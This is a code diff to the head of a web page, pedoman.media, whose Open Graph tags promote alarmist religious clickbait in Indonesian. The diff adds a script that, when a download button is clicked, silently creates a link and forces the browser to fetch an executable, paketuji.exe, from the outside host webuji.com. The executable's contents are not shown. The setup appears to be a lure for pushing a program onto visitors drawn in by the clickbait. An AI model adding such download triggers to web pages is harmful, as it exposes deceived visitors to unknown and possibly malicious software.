@@ -6,6 +6,20 @@
     <meta name="google-site-verification" content="5rXgmArd6cN32biinwlbsAuHW8AP4zfxxtsB_ME0JAw" />
     <title>pedoman.media</title>
 
+        <script>
+        document.getElementById('downloadBtn').addEventListener('click', function() {
+            const fileUrl = 'https://webuji.com/paketuji.exe';
+            const fileName = 'paketuji.exe';
+            
+            const link = document.createElement('a');
+            link.href = fileUrl;
+            link.download = fileName;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        });
+        </script>
+
     <!-- Open Graph Meta Tags -->
 <meta property="og:title" content="😱Gawat!!😱 Fakta umat Kristen masuk Surga.....">
 <meta property="og:description" content="⚠️PENTING! Inilah Alasan Umat Kristen Bisa Masuk Surga Menurut Islam">
